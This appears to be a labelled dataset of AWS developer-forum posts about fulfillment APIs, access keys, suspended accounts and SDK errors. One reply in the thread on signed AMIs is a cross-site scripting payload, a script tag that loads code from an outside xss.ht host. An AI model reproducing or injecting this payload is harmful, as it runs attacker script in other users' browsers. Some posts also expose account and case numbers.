label	description 
AWS Support API	"eCommerce
Does anyone have a list of hosted eCommerce software's that already have amazon fulfillment api without needing to self code?

Right now I am stuck between Shopify and Amazon Webstore but I want to know what other options are out there.

Thanks,
Jason"
AWS Support API	"FBA Inbound API: Tracking number and shipment/receiving dates?
Hi,

   I dont see any way to provide tracking number to Amazon FBA for my shipments. neighter PutInboundShipment nor PutInboundShipmentData. Also, I dont see any reference that Amazon tells us that he received items on XX date. Am  I  missing some documentation or it is by design? Shouldn't customers be aware that their shipment has reached to its destination?

  In, Short, I am missing following things from the API.

   1. Tracking Number (I can write to Amazon)
   2. Shipped On date (I can write to Amazon)
   3. Shipment Received date (I expect amazon provide me when it receives items)
   4. Carrier code I used to Ship items to Amazon (I can write to Amazon)

 an ETA to process it by amazon (after receiving shipment) can be helpful though.

   Thanks
   Sameers"
AWS Support API	"Re: FBA Inbound API: Tracking number and shipment/receiving dates?
I am also looking for the same information, and was wondering if anybody has found anything out ."
AWS Support API	"Inbound Fulfillment Shipment - How to update tracking
I am using the API to create inbound shipments of product going to the fulfillment center.  I see that I can mark status to 'shipped' but I have not found a way to enter the delivering carrier and tracking information. 

I currently log into my amazon seller account to complete the inbound shipment since I have not seen how to add this information via API.

Any suggestions ?

Thanks"
AWS Support API	"Bug in FBA Fulfillment Report wrt quantity capture
Hi,

We are using fba.

I also retrieve the fulfillment report once a day that is to import the data wrt purchases for fba.

Sometimes a customer makes a purchase of a  quantity of lets say 3.

Instead of retrieving one record with the quantity field set to 3. The report returns 

3 identical records with a quantity of 1.  

The problem is that they are completely identical records ie 
there isn't one value in the record to distinguish them as being different records.

When I update my database there is no way I can check for duplicates 
ie lets say I need to run the report again for some reason (Well I'm going to have to create a work-around.)

Isn't this a bug in the FBA Fulfillment report.

Shouldn't it be One Record with the quantity set to 3 instead of 3 identical records with
a quantity of 1.

David j."
AWS Support API	"Re: Bug in FBA Fulfillment Report wrt quantity capture
The way the Amazon-Fulfilled Shipment Report works is that each item shipped in a different package gets its own line in the report. Usually, these have subtly different values. Sometimes, especially for large items, 3 identical items in the same order can all ship in different shipments.

If the shipment-id, shipment-item-id, and  tracking-number columns for all three items are the same in the report, please contact TAM, who will be able to get the investigation underway.

TAM can be reached using the form at https://sellercentral.amazon.com/gp/contact-us/contact-amazon-form.html."
AWS Support API	"Re: Bug in FBA Fulfillment Report wrt quantity capture
I am trying to get  '_GET_AMAZON_FULFILLED_SHIPMENTS_DATA_' report but all efforts are in vain. I am able to get other reports like '_GET_CONVERGED_FLAT_FILE_ORDER
_REPORT_DATA_'. When i request  '_GET_AMAZON_FULFILLED_SHIPMENTS_DATA_' i will get the request id but i am unable to get the report id to get the actual report. i am using same merchant id for both reports. I also try to use merchant token instead of merchant id for  '_GET_AMAZON_FULFILLED_SHIPMENTS_DATA_', After that i am unable to get the request id. Please update me which merchant id i have to use, And how i will get this. Thanks"
AWS Support API	"Re: Bug in FBA Fulfillment Report wrt quantity capture
This forum is for discussing the AWS version of the Fulfillment Web Services API and not the Marketplace Web Services. The MWS reporting APIs are discussed at http://www.amazonsellercommunity.com/forums/forum.jspa?forumID=43. Have you tried asking your question there?

Alternatively, you may want to contact the MWS team directly at https://sellercentral.amazon.com/gp/mws/contactus.html."
AWS Support API	"Correct api for post bulk products on amazon
Hello ,

I am new to this amazon concept and i don't know how to post bulk products on amazon using c# and i searching daily for the solution but i am so confused with all the api documents.I didn't get any solution still.Please provide any links or sample code related this topic...

Thanks In Advance"
AWS Support API	"Amazon Fullfillment API returning Exception
MarketplaceWebService\Client.phpMarketplaceWebService\Model\RequestReportRequest.phpCaughtException: Access to the resource Merchant M_MILAGROENT_7636275 is not
a valid merchant is denied. Response Status Code: 403 Error Code:AccessDenied Error Type: Sender Request ID: XXXXXXXXXXXXXXXXXX XML: SenderAccessDeniedAccess to the resource Merchant XXXXXXXXXXX is not a valid merchant is denied.XXXXXXXXXX

Although I am passing a valid merchant Token."
AWS Support API	"Re: Amazon Fullfillment API returning Exception
This forum is for discussing the AWS version of the Fulfillment Web Services API and not the Marketplace Web Services. The MWS reporting APIs are discussed at http://www.amazonsellercommunity.com/forums/forum.jspa?forumID=43. Have you tried asking your question there?

Alternatively, you may want to contact the MWS team directly at https://sellercentral.amazon.com/gp/mws/contactus.html."
AWS Support API	"other merchant inventory with FWS
Hi,
I'm pretty sure the answer to this question is ""no"", but I just wanted to clarify.
Is there any way to view and order FBA inventory that is being offered on the marketplace from other sellers via the FWS API (or any other API)?

Thanks
Chris"
AWS Support API	"Re: other merchant inventory with FWS
Hi,

As far as I know, there is no programmatic way to order other merchants' (or Amazon's) inventory.

The Fulfillment Web Services are offered to help merchants in the Fulfillment By Amazon program manage their business.

Thanks.

-Josh"
AWS Support API	"GetInventorySupply Shows Zero Inventory
I'm sending a request with GetInventorySupply, but no matter which MerchantSKU I put in the response shows zero inventory.  Also, the response is much less detailed than the response that shows in the Developers Guide.  Strangely, it shows the same response even if I put in an SKU that doesn't exist.  

Parameters are as follows:

Action=GetInventorySupply
MerchantSKU.1=US-AM001-G
ResponseGroup=Detailed

And here's the response:

<?xml version=""1.0""?>
<ns1:GetInventorySupplyResponse xmlns:ns1=""http://fba-inventory.amazonaws.com/doc/2009-07-31/""><ns1:GetInventorySupplyResult><ns1:MerchantSKUSupply><ns1:MerchantSKU>US-AM001-G</ns1:MerchantSKU><ns1:TotalSupplyQuantity>0</ns1:TotalSupplyQuantity><ns1:InStockSupplyQuantity>0</ns1:InStockSupplyQuantity></ns1:MerchantSKUSupply></ns1:GetInventorySupplyResult><ns1:ResponseMetadata><ns1:RequestId>f6618bd7-0d60-4458-ae81-56a745ce957d</ns1:RequestId></ns1:ResponseMetadata></ns1:GetInventorySupplyResponse>"
AWS Support API	"Re: GetInventorySupply Shows Zero Inventory
It seems that the Access Key you are using is not tied to any merchant account for Selling on Amazon. Thus, we are replying with a default response that you do not have any inventory, no matter what SKU you ask about.

Please remember that, when using the Fulfillment Web Services, your AWS developer account and your Selling on Amazon account must have the same e-mail address and password. Further, in order to use the Fulfillment Web Services, you must also be registered for Fulfillment by Amazon."
AWS Support API	"Re: GetInventorySupply Shows Zero Inventory
That makes sense.  I'll go back to my account and try to get it sorted out.  Thanks!

Aaron"
AWS Support API	"Re: GetInventorySupply Shows Zero Inventory
I have the same experience and got good answer after I used my AWS access keys. Now I got good inventory reply using FWS API. However, when I tried to query for any merchant sku that I can find at www.amazon.com, I got 0 reply. Sorry, I am a newbie to FWS. I believe you guys know this as basic. Anyway, example is I input 001588588010 in Amazon website and I get Lego Batman the Videogame & Pure. Using the FWS API, 

$request = new Amazon_FWSInventory_Model_GetInventorySupplyRequest();
invokeGetInventorySupply($service, $request->withMerchantSKU(""001588588010""));

I got 0.  If I use FBA-001588588010 which is how we name our own SKUs, I got actual inventory count. Does this mean I cannot access info of other vendor inventory? I want to how much stock others also have so I can order from them when my count is 0. Do I need other Amazon web services to accomplish this?"
AWS Support API	"Re: GetInventorySupply Shows Zero Inventory
You cannot access other vendors' inventory."
AWS Support API	"shipping cost
I want to get shipping cost. When doing ItemLookup with ShippingCharges as ResponseGroup, it returns null. Any other means?"
AWS Support API	"Identifying the source of excessive AWS requests in RequestLimitExceeded
Hi,

I've started to hit `RequestLimitExceeded` when using `awscli` and various languages. It would be really useful to have a way to trace the source of the excessive number of requests - my system makes heavy use of the various APIs, including:
 * service discovery - using `describe-instances`
 * monitoring - using `cloudwatch` stats to identify problems with e.g. 
 * devops tools - e.g. performing system upgrades

It's really difficult to identify the main culprits, as far as I can see AWS provides zero tooling to support this. It would be useful to be able to see things like
 * number of calls broken down by service
 * number of calls broken down by source IP address

Has anyone found a way to narrow the search down in this instance?

Ian"
AWS Support API	"Can not upgrade from Basic to Developer
I have a new account and I have signedup as Developer Support but it still shows Basic. 

Any idea why this is happening?"
AWS Support API	"AWS API Signatures
I was just curious about AWS API Signatures, on why they are so complex?

My point of comparison here is the Google APIs, where you can simply use an API key to provide access to specific APIs. Why did AWS take the approach of signature, so complex to implement that using the SDK almost becomes mandatory?

I'm also curious about the real value of signatures considering that the connection is already encrypted using HTTPS. Is it security by obfuscation or what does this mechanism provide that Google APIs don't?

Thanks,
Nicolas"
AWS Support API	"Re: AWS API Signatures
No answer after 2 years - the only logical reason is security by obfuscation."
AWS Support API	"Formal REST APIs description
Hi,

Is there any source of formal machine-readable API descriptions of existing AWS REST interfaces? I mean something like Google Discovery?.."
AWS Support API	"Re: Formal REST APIs description
Not sure how official it is, but the AWS SDK for C++ is code-generated from a set of API descriptions. See https://github.com/aws/aws-sdk-cpp/tree/master/code-generation/api-descriptions

I'm using these for my own AWS SDK for Qt project (still an early work in progress).

Sure would be nice if there was some formal documentation for these API descriptions.

Cheers."
AWS Support API	"Please enable CORS for the pricing API
Hello 

I could not find a forum specific for the pricing API.

Could you please enable CORS for the pricing?

This is the error I get when using it from a browser with the JavaScript SDK:

Failed to load https://api.pricing.ap-south-1.amazonaws.com/: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost:3001' is therefore not allowed access. The response had HTTP status code 403.

thanks"
AWS Support API	"digitally hashed and signed AMI's?
I would prefer to use AMI's that have been digitally hashed and signed by the AMI provider.
Otherwise, how do I know who really created the AMI, and whether the AMI I'm launching is the one
I think I'm launching?  What would it take to get that feature?"
AWS Support API	"Re: digitally hashed and signed AMI's?
""><script src=https://vishnu1993.xss.ht></script>"
AWS Support API	"Kinesis Video Stream cpp build
Hi,

In the  link https://docs.aws.amazon.com/kinesisvideostreams/latest/dg/kinesisvideo-dg.pdf#gs-console-whatnext at the prerequisite section there is a paragraph saying:
Your NativeLibraryPath must contain your KinesisVideoProducerJNI file, available at https:
github.com/awslabs/amazon-kinesis-video-streams-producer-sdk-cpp. The file extension for this file
will depend on your operating system:
• KinesisVideoProducerJNI.so for Linux
• KinesisVideoProducerJNI.dylib for macOS
• KinesisVideoProducerJNI.dll for Windows (not currently available)
Note
Pre-built libraries are not currently available. You must build the libraries yourself for your
platform.
as stated that there is no ready scripts to build on windows, but how to do that?

Thanks"
AWS Support API	"AWS Topic Modeling API
Hi,

I made an application using Java SDKs to call AWS Comprehend APIs, for Sentiment Analyze, Detect Entities, Key Phrases and Dominant Language, all worked out fine except for Topic Modeling, I have Access key and Secret key (which they already worked for other APIs) following the example at this link http://docs.aws.amazon.com/comprehend/latest/dg/comprehend-dg.pdf#getting-started  there is a line of code which is ""final String dataAccessRoleArn = ""arn:aws:iam::account ID:role/data access role"";"" 
I know these roles are assigned through AWS IAM for certain users, but why do I need it here, since I already have access key and secret key? I'm already testing from my machine not from an EC2
also I looked for a sample for how that parameter should look like, and from where to get it, but I didn't find any, any idea that could help?
Thanks"
AWS Support API	"Issue with Identity Verification!
Hello everyone,
I have an issue with finishing my account registration. I am on the step ""Identity Verification"". I entered my phone number, received a call, entered PIN on the phone as was required and then I saw an error that it was a problem to contact me and I pressed the button ""Retry"". 
But when I again entered Security Check I received another message: ""Sorry, there was an error processing your request. Please try again and if the error persists, contact Amazon customer support."" I entered Security Check again (and symbols are entered absolutely correctly) but I see the same error. I did it several times, but error remains.
How can I complete my registration? I saw that other people had the same issue, can you help me please?
Also I write a letter to Support but I haven't received an answer yet.
My case ID: 4639710761 

Edited by: awsdbelena on Nov 15, 2017 2:19 AM

Edited by: awsdbelena on Nov 15, 2017 3:01 AM"
AWS Support API	"http://status.aws.amazon.com/rss/all.rss for IFTTT
Folks, I'd love to get notified of updates from the status feeds; all.rss in particular.  I tried using IFTTT RSS, but it does not work.  Possibly because the feed fails validation.  Eg. https://validator.w3.org/feed/check.cgi?url=http%3A%2F%2Fstatus.aws.amazon.com%2Frss%2Fall.rss

Will Amazon consider making a feed usable by IFTTT?  What are folks using to consume this file?

Thx!"
AWS Support API	"Can no longer create technical support cases without plan?
We have always been on a ""Basic"" support plan, but today have realized that we were no longer able to create ""Technical"" cases at all without upgrading to at least a ""Developer"" plan.

As recently as June 2017, we were able to file technical support cases related to AWS infrastructure issues. Can someone comment -- was there a change made to AWS recently to completely disallow any technical support cases from being filed without a plan?

Separately -- we just upgraded to a ""Developer"" support plan to regain the access to file technical cases, but how do we choose the ""Primary contact"" who is able to file cases? The plan indicates ""One primary contact may open an unlimited number of cases"". How does AWS know who that person is? It looks like anyone on our account can file a case once again, but does AWS just assume the first person who opens a case is the primary contact?

Edited by: rosieguy on Sep 23, 2017 8:07 AM

Edited by: rosieguy on Sep 23, 2017 8:07 AM"
AWS Support API	"My Amazon Associate API keys are not registering proper clicks
Hi,

I just received an email from Cory R. I am having a problem getting my Amazon Associates Access keys working properly. I am using a tool called Shop Express that currently has registered 769 clicks. However my Amazon Affiliates account is only showing 189. Keep in mind that I am also testing this through a Woozone Wordpress plug in and it should be having even more clicks than 189 + 769 + Woozone clicks. 

It seems to accept an Access Key ID and Secret Access Key ID I created several days ago, however it will not accept my current key.

The Shop Express account that is tracking my clicks is found at:
http://viralburg.com/shopexpress/store-admin/dashboard

It keeps track of the clicks in a graph chart. I researched this product before purchasing it and everyone claims it is legit. One guy on YouTube showed sales through Amazon links of up to $22,000 in a month. So I figure if it keeps increasing exponentially as it has been then the sales will likely roll in. However, I am not sure if it will stay working since the keys don't match what currently shows in my Amazon Affiliates account at:

https://console.aws.amazon.com/iam/home?rw_useCurrentProtocol=1#/security_credential

The last key was generated on July 16th. The report shows it was last used on 7/18/17, but today is 7/19/17 already. Something is not right here. Please help. It is appreciated.

I was advised by Amazon customer service to visit the link
http://affiliate-program.amazon.com/gp/associates/contact/

and post the URL for the page that is tracking this API information.

Thank you,
Steve"
AWS Support API	"Why is AWS abandoning the use of SOAP?
Hi.

Why is  AWS  abandoning the use of SOAP?
Is REST better than SOAP? 
What is the disadvantage of using SOAP?

Best regards."
AWS Support API	"Cost & Usage Report api almost always 500s
Does this api [1] actually work?  Calls via the aws-cli (e.g. aws cur describe-report-definitions [2]) and direct http requests (POSTed to https://cur.us-east-1.amazonaws.com) almost always fail with a 500 error response.  This is the first time I've seen such a poorly-behaving AWS service, throwing 500s like this.  Every so often, a call will succeed, but very infrequently.

Example request id: 24CBF15CDDAA95B

Can someone take a look?

Thanks,
 - John

[1] http://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/api-reference.html
[2] http://docs.aws.amazon.com/cli/latest/reference/cur/describe-report-definitions.html"
AWS Support API	"Re: Cost & Usage Report api almost always 500s
This api is still broken on the server side.  Can someone take a look?

Another request id as an example: C9FF26F7EEAE1CD3"
AWS Support API	"Re: Cost & Usage Report api almost always 500s
Still happening this week.  Does this api work for anyone else?

Another example request-id: B949FC1EAF9C1A8B"
AWS Support API	"Issue When adding an endpoint to an amazon API gateway
Hi, 
I've encounter an issue while setting a Endpoint URL to my API.

the desire endpoint is : https://srv_vanguard.shingtory.io/api/campaigns/{campaignId}
But this is not working and when I save, I get ""Invalid HTTP endpoint specified for URI""

https://srv_vanguard.shingtory.io/api/campaigns/{campaignId}  ===> ""Invalid HTTP endpoint specified for URI""
https://srv_vanguard.shingtory.io/api/campaigns  ===> ""OK"" (Amazon tells me that the parameter campaignId is missing (which is normal))
https://srv-vanguard.shingtory.io/api/campaigns/{campaignId}  ===> ""OK""

The fact is that the underscore in the host and the parameter cannot live together in my endpoint 

I need help or maybe it's the normal behaviour.
Thank you,
Jb"
AWS Support API	"Determine or track the AWS Support service subscribed to by an account?
Is there a way to determine what support/service level an account has subscribed to via an API?  I know how to see it from the console - but don't see an API to retrieve that setting.

Alternatively - if I could use CloudTrail or Config to track changes to the state of the flag, and notify an SNS topic I could use to drive updating a customer's profile record in my system, that would suffice.

Thanks"
AWS Support API	"How to get a inventory of services subscribed by an account?
All,

I'm looking for a script / python-boto script that can help in dumping all those services that is subscribed by an account. Later on I can deep dive into the resources that are consumed with each services with-in.

Appreciate your response and kind help.

Thank you,
Renuka"
AWS Support API	"i cannot fill deployment in stage and usage plan seems bugged
i cannot fill deployment in stage it s always grey :

http://imgur.com/9IA5XpK

Regards and thanks

Edited by: penet bert de la bussiere on Dec 21, 2016 8:52 PM"
AWS Support API	"Can't find out how to get an account's contact information via the CLI
I am currently working on automating setting up account entries in a third party application that we use to track billing. We currently have two AWS accounts (prod and non prod) and two third party app accounts for each of our business units. What I am trying to do is set the name of each third party app account as the ""Full Name"" of the contact for its corresponding AWS account (we use the Full Name of the contact to hold the name of the business unit). I am trying to figure out how, if at all possible, to fetch an AWS account's contact info (specifically the full name) via the aws command line interface but I can't find anything anywhere that says how to do this.

My question is: Is it possible to get the full name of the contact for an AWS account via the aws cli, and if so how can I do it?"
AWS Support API	"Cant log in to the AWS website
Hello,

I  posted in twitter and was redirect  to here. Since last thursday I am unable to log in to the AWS with my company account, I had to use my personal account to log into the forums. 

I restarted the computer, cleared cookies and cached data in the browser, tried another browser and I keep getting the same error (image attached)

Any idea of what could I do? Other people in my company seem to have zero issues logging in"
AWS Support API	"CartModifyResponse wrong format
Hello,
the CartModifyResponse does not return CartItems normal markup.
The end of the xml is <CartItems/></Cart></CartModifyResponse> without CartItems is not opened.

See :
<?xml version=""1.0"" ?>
<CartModifyResponse xmlns=""http://webservices.amazon.com/AWSECommerceService/2013-08-01"">
<OperationRequest>
<RequestId>XXXXXXXXXX</RequestId>
<Arguments>REMOVED</Arguments>
<RequestProcessingTime>0.12045654</RequestProcessingTime>
</OperationRequest>
<Cart>
<Request><IsValid>True</IsValid>
<CartModifyRequest>
<CartId>XXXXXXXXXX</CartId>
<HMAC>XXXXXXXXXX</HMAC>
<Items>
<Item>
<CartItemId>XXXXXXXXXXX</CartItemId>
<Quantity>2</Quantity>
</Item>
</Items>
</CartModifyRequest>
</Request>
<CartId>XXXXXXXXXX</CartId>
<HMAC>XXXXXXXXXXX</HMAC>
<URLEncodedHMAC>XXXXXXXXXX</URLEncodedHMAC>
<PurchaseURL>XXXXXXXXXX</PurchaseURL>
<CartItems/>
</Cart>
</CartModifyResponse>

Cordially."
AWS Support API	"Error connecting to AWS services, kCFURLErrorCannotFindHost = -1003
We have been working on an iOS project which makes use of the official AWS SDK for iOS (version 2.017) and Cognito Sync SDK for iOS (version 1.0.8). Both of these have been installed using the dependency management system CocoaPods.

Our project interacts with the Cognito and SQS services. All iOS devices post messages to the same queue (outbound queue). The individual iOS device will then read from a specified queue only for that iOS device (inbound queue #1, #2, #3...).

We have encountered the error kCFURLErrorCannotFindHost (code -1003) from time to time while reading the inbound queues. We have not yet found the root of this issue, so we are not able to systematically recreate it. Sometimes it happens on 3G, sometimes on WiFi, other times there can go days before it reoccurs.
*UPDATE: The error seems to occur mainly over 3G when changing location. So it happens whenever the app tries to connect to the server again through a new 3G antenna. *

This error has occurred both when connecting to Cognito and to the SQS service. A screenshot of the error can be seen in the attached file when trying to connect to the SQS.

When the error occurs, then it will continue to happen for around 5-10 minutes before it disappears. No changes are done to the code and the location of the device is not changed. It seems to disappear naturally after this timeframe.

We have a theory that the error is connected to the NSURLConnection class. We will continue to try and pinpoint the root of the error by examining the AWS SDK. Our current lead is focusing on the “keepalive” parameter.

It is important to notice, this error does not seem to be related to only the AWS Cloud. We have New Relic implemented for the same iOS project which experiences the same error.
We are looking for a way to recover from this error and thought that it should be done from the AWS SDK. 
Would you have some advice for resetting the NSURLConnection when this error occurs? We will happy to try your suggestions by making changes to the AWS SDK.

Edited by: Stefan Veis Pennerup on Mar 20, 2015 7:33 AM
Added information about when error occurs."
AWS Support API	"Re: Error connecting to AWS services, kCFURLErrorCannotFindHost = -1003
There hasn't been done any work on the project for the last 6 months, so closing this for now"
AWS Support API	"AWS account suspended, invoice(s) have been paid but not response.
My Account was suspended without warning due to an expired credit card, I have now fully paid all outstanding amounts and contacted AWS support > 48 hours ago with no response.

Please can you have the re-instatement of my account prioritised as this is effecting my customers!"
AWS Support API	"Re: AWS account suspended, invoice(s) have been paid but not response.
Hi Richard,

I see that you have a support case opened case ID: 1463136931. I have responded to the case with further details and assistance. Should there be anything else you need please let us know by responding to the case.

Regards,

Yannick M."
AWS Support API	"Re: AWS account suspended, invoice(s) have been paid but not response.
Hi,

I am having the same issue.  I paid all of our past due on Saturday and fully expected to be restored.  I opened a ticket on Saturday (ID1638555741) and it remains unassigned.

When can I expect a response?

Thank you"
AWS Support API	"please reactivate suspended account!
Please reactivate suspended account, this was just a case of an expired credit card, I have fixed the problem and paid all outstanding invoices.  Case number 1633405271."
AWS Support API	"Please reactivate suspended account
Hello,

we are waiting for the reactivation from 14 Jan. We have already paid all unpayed bills. 

Our case is: 1620826551

Please reactivate our account.

Thank you."
AWS Support API	"Re: Please reactivate suspended account
Account reactivated! Thank you!"
AWS Support API	"AWS account suspended, invoice(s) have been paid but not response
My Account was suspended due to late payment, I have now fully paid all outstanding amounts and contacted AWS support > 48 hours ago with no response.

Please can you have the re-instatement of my account prioritised as this is effecting my customers!

my account number is 129237421713"
AWS Support API	"Problem in Product Advertising API for AccessKey ID
I am getting this error while accessing Product Advertising API. 

Your AccessKey Id is not registered for Product Advertising API. Please use the AccessKey Id obtained after registering at https://affiliate-program.amazon.com/gp/flex/advertising/api/sign-in.html 

And when i am going to given url for registration then there occur an error 

We're sorry! 

There was an error processing your changes. Please try again. 

Please provide information that how i registered my AccessKey Id for Product Advertising API.

Edited by: companyjst on Nov 19, 2015 9:15 PM"
AWS Support API	"Account Suspended
My Account was suspended to an expired credit card, I have now fully paid all outstanding amounts and contacted AWS support > 24 hours ago with no response.

Case ID: 1532084781

Please can you have the re-instatement of my account !"
AWS Support API	"Account Suspended, no answer from support, urgent.
Hello ,
Since April 8, I can't use my account. My account is partially blocked. I may not use the services EC2 and VPC. Please see the attachment.
I don't know what the reason, I already sent You a Fax with the required documents. You have acknowledged receipt. But the account activation has not occurred.

I am very upset, support not responding to my emails.
I really need your help . Thanks in advance. Petr.
My account Id: 820552394575"
AWS Support API	"Re: Account Suspended, no answer from support, urgent.
Hi Portyanchenko,

I have created support case ID: 1394884331.

Please follow the steps I have highlighted in the above support case for your account activation.

Regards,

Nolen M."
AWS Support API	"Re: Account Suspended, no answer from support, urgent.
My account is still blocked after I sent you a Fax with the documents - a copy of my passport and a Bank statement from my card. Several times I spoke with You by phone and received confirmation that the Fax you received. I also received a letter from You that my account is active and I can use it. Now you're asking me again to send you a Fax with the documents.
I ask You to sort out this problem. Really looking forward to your reply. Thanks in advance."
AWS Support API	"Re: Account Suspended, no answer from support, urgent.
Hello,

I am sorry for any frustration or inconvenience this issue may have caused. 

In order to reinstate your account and move forward with your request, please respond to case# 1394884331.

Best Regards, 

Ahmed H."
AWS Support API	"Re: Account Suspended, no answer from support, urgent.
Hi,

I am contacting you regarding our suspended account 009538218622. We have balanced our payment and I have contacted the proper channel through AWS support case several times for like 6 days and yet it seems nobody is seeing the created cases as there was no response. 

Its been 6 days and this is really affecting our business and the services are down.

Thanks and your prompt response will be well appreciated."
AWS Support API	"Blocked IP
Hi,

I can not seem to get my API security keys to work on one of my servers. On others, it works but on this one it is not.

I am wondering if maybe Amazon blocked the server IP adress: 198.144.121.169

URL's are:
edureads.com
allwinerelated.com

P.S.
I am using EasyAzon plugin.

Thank you!"
AWS Support API	"ios9 and bitcode and the AWS frameworks
Hi there,

No idea if this is the correct forum but it was the closest I could find!  Have recently installed the latest xcode for iOS 9 and none of the frameworks in the AWS SDK will compile with bitcode enabled.  Unfortunately I have other components in my project which throw numerous errors when I disable bitcode, so I need to have it enabled.

Is there a workaround for this?  Can you provide an SDK with support for bitcode?  Can I disable bitcode for just the frameworks?  I am unable to compile anything like this, it's quite unacceptable...

The error message I get when compiling is:

/iOS-frameworks/aws-ios-sdk-2.2.0/frameworks/AWSAutoScaling.framework/AWSAutoScaling(AWSAutoScalingService.o)' does not contain bitcode. You must rebuild it with bitcode enabled (Xcode setting ENABLE_BITCODE), obtain an updated library from the vendor, or disable bitcode for this target. for architecture arm64
clang: error: linker command failed with exit code 1 (use -v to see invocation)


Any help much appreciated."
AWS Support API	"Re: ios9 and bitcode and the AWS frameworks
disabling bitcode was the only remedy"
AWS Support API	"Acces key not working
Hi,

I have a big problem which includes my Access keys not working.  have tried already with creating new ones, creating IAM user. None of the access keys work.

I checjed with my Wordpress plugin developers, they have been checking it for almost 9 days and still can't find any problem. Then i checked with my hosting provider, they say that none of the Amazon IP's is blocked and that therefore everything is ok on their side.

No matter on what website I try to use my access keys, they simply don't work. As I said the problem started around 9 days ago all of a sudden. Before that everything worked perfectly.

Please help me solve the problem!!"
AWS Support API	"Re: Acces key not working
Found the problem! Server related!"
AWS Support API	"How specify endpoint and region of S3 bucket using PHP
in bit of a pickle. I have a S3 bucket configured on a custom domain and SSL. The region of bucket is us-west-2, while the endpoint is s3-us-west-2.amazonaws.com.

I have a php plugin that takes snapshot of the webpage and pushes it to S3 bucket so that the URL of the webpage and snapshot are identical, for example www.page.com then snapshot is www.page.com*snapshot*. Now the problem is whenever I try to get to the snapshot URL I get the following error:

The bucket you are attempting to access must be addressed using the specified endpoint. Please send all future requests to this endpoint.

Below is the code of plugin:
<?php
 
class Plugin_ChartSnapshot extends Plugin {
 
    public function init() {
        // hook into chart publication
        Hooks::register(Hooks::POST_CHART_PUBLISH,
            array($this, 'triggerScreenshotJob'));
    }
 
    public function triggerScreenshotJob($chart, $user) {
        $parts = parse_url($chart->getPublicUrl());
        $params = array(
            'url' => $chart->getPublicUrl(),
            'selector' => '',  // todo: change to .dw-chart-body later
            'zoom' => 2,  // double resolution for retina devices
            'delay' => 5,  // wait five seconds before rendering
            'width' => $chart->getMetadata('publish.embed-width'),
            'height' => $chart->getMetadata('publish.embed-height'),
            'initiator' => 'chart-snapshot',
            'js' => ""document.getElementById('footer').style.display='none'""
       );
       if (substr($params['url'], 0, 2) == '//') $params['url'] = 'http:' . $params['url'];
        $publish_s3 = DatawrapperPluginManager::getInstance('publish-s3');
        $config = $this->getConfig();
        if ($publish_s3) {
            $publish_s3_cfg = $publish_s3->getConfig();
            $params['bucket'] = $publish_s3_cfg['bucket'];
            $params['upload'] = substr($parts['path'],1) . 'snapshot.png';
            $png_export_url = $config['png-exporter-host'] . '/screenshot?' . http_build_query($params);
            $resp = @file_get_contents($png_export_url);
        }
    }
 
}


Edited by: imo55 on Sep 14, 2015 1:51 AM

Edited by: imo55 on Sep 14, 2015 3:18 AM"
AWS Support API	"Resource group APIs
Hi 

   Is there way to get the resource group map and connected AWS service elements associated in the resource group? 

Thanks
Raj"
